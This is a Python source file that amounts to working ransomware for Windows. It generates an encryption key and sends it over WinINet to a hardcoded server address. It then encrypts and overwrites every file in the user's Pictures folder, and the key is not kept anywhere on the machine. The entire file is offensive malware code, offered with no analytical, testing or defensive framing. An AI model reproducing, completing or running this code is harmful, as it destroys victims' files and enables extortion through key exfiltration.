#pip install cryptography
 
import os
from cryptography.fernet import Fernet
import ctypes

# Load WinINet library
wininet = ctypes.windll.wininet

# Define constants
INTERNET_OPEN_TYPE_DIRECT = 1
INTERNET_FLAG_KEEP_CONNECTION = 0x00400000


# Define constants
GENERIC_WRITE = 'wb'
GENERIC_READ = 'rb'
CREATE_ALWAYS = 'wb'
OPEN_EXISTING = 'rb'
def send_text_to_server(text):
    url = "http://192.168.1.9:5000/key?text=" + text  # Append the text to the URL
    headers = "Content-Type: application/x-www-form-urlencoded\r\n"

    # Initialize WinINet
    internet_handle = wininet.InternetOpenW("Python Application", INTERNET_OPEN_TYPE_DIRECT, None, None, 0)

    if internet_handle:
        # Open connection to the server with GET method
        connection_handle = wininet.InternetOpenUrlW(internet_handle, url, None, 0, INTERNET_FLAG_KEEP_CONNECTION, 0)

        if connection_handle:
            # No need to send HTTP request for GET method, it's implicit

            print("Text sent successfully to server.")

            # Close connection
            wininet.InternetCloseHandle(connection_handle)
        else:
            print("Failed to open connection to server.")

        # Close WinINet
        wininet.InternetCloseHandle(internet_handle)
    else:
        print("Failed to initialize WinINet.")



def write_to_file(file_path, text):
    try:
        with open(file_path, GENERIC_WRITE) as f:
            f.write(text)  # Encode text as bytes before writing
            print("Text written to file successfully.")
    except OSError as e:
        print(f"Failed to write text to file: {e}")

def read_file(file_path):
    try:
        with open(file_path, GENERIC_READ) as f:
            content = f.read()
            print("File contents:")
            print(content)  # Decode bytes to text after reading
            return content
    except OSError as e:
        print(f"Failed to read file: {e}")



def generate_key():
    return Fernet.generate_key()

def encrypt_message(key, message):
    cipher = Fernet(key)
    encrypted_message = cipher.encrypt(message)
    return encrypted_message

def decrypt_message(key, encrypted_message):
    cipher = Fernet(key)
    decrypted_message = cipher.decrypt(encrypted_message).decode()
    return decrypted_message


# Usage
def main():
    # Generate key
    key = generate_key()
    try:
        text_to_send = str(key)
        send_text_to_server(text_to_send)
    except Exception as e:
        print("An error occurred:", e)


    # Text to be encrypted (can be dynamic)
    # plain_text = input("Enter the message to encrypt: ")

    # Encrypt the text


    # # Decrypt the text
    # decrypted_text = decrypt_message(key, encrypted_text)
    # print("Decrypted:", decrypted_text)
    # # Define the path to the user's "Pictures" directory
    pictures_dir = os.path.join(os.path.expanduser("~"), "Pictures")

    # List to store text file paths
    file_paths = []

    # Walk through the directory tree
    for root, dirs, files in os.walk(pictures_dir):
        for file in files:
            # Check if the file is a text file (you can adjust the extensions as needed)
            # if file.lower().endswith('.txt'):
                # Construct the full path to the text file
                text_file_path = os.path.join(root, file)
                # Add the path to the list
                file_paths.append(text_file_path)

    # Now, file_paths contains all text file paths in the "Pictures" directory
    print("Text file paths:")
    for path in file_paths:
        content = read_file(path)
        encrypted_text = encrypt_message(key, content)
        print("Encrypted:", encrypted_text)
        print(path)
        # Example of writing to the file
        text_to_write = encrypted_text
        write_to_file(path, text_to_write)

if __name__ == "__main__":
    main()




 




   
